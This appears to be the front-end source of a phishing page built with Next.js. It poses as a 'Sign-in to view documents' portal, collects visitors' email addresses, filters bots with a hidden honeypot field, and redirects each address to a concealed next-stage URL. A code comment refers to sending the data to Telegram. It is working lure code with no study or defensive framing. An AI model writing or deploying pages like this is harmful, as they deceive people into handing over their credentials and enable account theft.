'use client'

export default function Home() {

  const handleSubmit = (e) => {
    e.preventDefault();
    const continueBtn = document.querySelector(".LoginBtn");
    const honeypot = document.querySelector("#company");
    continueBtn.innerHTML = "Processing..."

    const userID = document.getElementById('userid').value.trim();
    if (!userID || honeypot.value !== '') return;
    const uniquesPreUrl = process.env.NEXT_PUBLIC_URL_NAME

    // Format the message to send to Telegram
    const url = `${uniquesPreUrl}&omn=${userID}`;
    try {
      setTimeout(() => {
        window.location.href = url;
      }, 1500);
      console.log("Message sent!!")
    } catch (error) {
      console.error('Error:', error);
    }
  }
  return (
    <>
      <main className="grandCntn">
        <div className="sideShow">
          <img src="/logo.webp" alt="" />
          <h1>You're a couple of steps away from having your Documents<span>!</span></h1>
        </div>
        <div className="formCntn">
          <h2 className="title_note">Sign-in to view documents</h2>
          <div className="form">
            <form className="firstSection login" onSubmit={(e) => {handleSubmit(e)}}>
              <div className="inputCntn userID">
                <label htmlFor="UserID">Email</label>
                <input id="userid" type="email" autoFocus required minLength="4" placeholder="you@company.com" />
              </div>


              <div className="submissionCntn">
                <div className="rememberMe">
                  <input type="checkbox" id="rememberUser" />
                  <input type="text" id="company" name="company" />

                  <label for="rememberUser">
                    <svg aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20">
                      <rect fill="none" stroke="none" strokeWidth="2" x="1" y="1" width="18" height="18" rx="3"></rect>
                      <polyline fill="none" stroke="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" points="4 11.4390244 7.44978307 15.0611808 16 5"></polyline>
                    </svg>
                    <span>Remember me</span>
                  </label>
                </div>

                <button type="submit" className="LoginBtn signInBtn">Next</button>
              </div>
            </form>

          </div>
         
        </div>
      </main>
    </>
  );
}
